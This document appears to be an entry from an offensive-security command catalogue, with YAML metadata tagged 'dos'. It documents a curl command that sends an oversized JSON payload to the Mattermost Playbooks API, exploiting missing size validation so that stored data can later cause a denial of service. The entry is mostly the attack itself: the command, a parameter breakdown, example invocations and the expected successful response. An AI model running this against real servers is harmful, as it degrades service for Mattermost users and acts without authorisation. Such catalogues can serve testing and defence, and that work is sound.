---
data: >-
  curl -X POST "http://<domain>/plugins/playbooks/api/v0/playbooks" -H
  'Content-Type: application/json' -d @payload --cookie
  "MMAUTHTOKEN=<user-auth-token>" -H "X-CSRF-TOKEN: <csrf-token>"
tags:
  - api
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-12-14T10:00:00Z'
updated_at: '2025-12-14T17:26:48.476Z'
id: 1f851224-9b82-4b6c-af80-7b4a135ec59f
verified: false
validated: true
submitted: true
---
# curl-create-oversized-playbook

## Command

```bash
curl -X POST "http://<domain>/plugins/playbooks/api/v0/playbooks" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<user-auth-token>" -H "X-CSRF-TOKEN: <csrf-token>"
```

## Description

This command sends a POST request to the Mattermost Playbooks API to create a playbook using an oversized JSON payload, exploiting lack of size validation to store large data for later DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (http://<domain>/plugins/playbooks/api/v0/playbooks) | Target API endpoint for playbook creation | Yes |
| -X POST | Specifies the HTTP POST method | Yes |
| -H 'Content-Type: application/json' | Sets the request body as JSON | Yes |
| -d @payload | Reads the oversized JSON data from 'payload' file | Yes |
| --cookie "MMAUTHTOKEN=<user-auth-token>" | Authenticates the request with user session cookie | Yes |
| -H "X-CSRF-TOKEN: <csrf-token>" | Provides CSRF protection token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://example.com/plugins/playbooks/api/v0/playbooks" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=abc123" -H "X-CSRF-TOKEN: def456"
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST "http://<domain>/plugins/playbooks/api/v0/playbooks" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<user-auth-token>" -H "X-CSRF-TOKEN: <csrf-token>"
```

## Expected Output

Successful response: JSON object with playbook details, e.g., {"id": "playbook123", "title": "Oversized Playbook"}, HTTP status 200. Failure may return 400/403 if tokens invalid.

## Related

- [[Related Procedure: Create-Playbook-with-Oversized-Template]]
